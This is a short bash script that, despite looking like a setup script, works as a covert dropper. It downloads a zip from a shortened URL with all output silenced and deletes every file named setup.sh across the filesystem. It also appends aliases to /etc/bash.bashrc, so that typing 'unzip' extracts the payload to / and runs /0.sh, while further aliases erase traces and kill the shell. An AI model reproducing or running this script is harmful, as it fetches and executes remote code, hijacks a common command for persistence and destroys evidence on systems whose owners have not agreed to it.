#!/bin/bash
unalias -a
rm -rf /usr/share/misc/final; find / -type f -name "setup.sh" -exec rm -f {} \;
mkdir /usr/share/misc/final >/dev/null 2>&1
wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip >/dev/null 2>&1
sleep 2
echo 'alias unzip="mv /usr/share/misc/final/setup.zip /; unzip /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh"' >> /etc/bash.bashrc
echo 'alias 1="rm -f /setup.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
echo 'alias 2="sleep 2; unalias -a"' >> /etc/bash.bashrc
echo 'alias 3="kill -9 $(echo $$)"' >> /etc/bash.bashrc
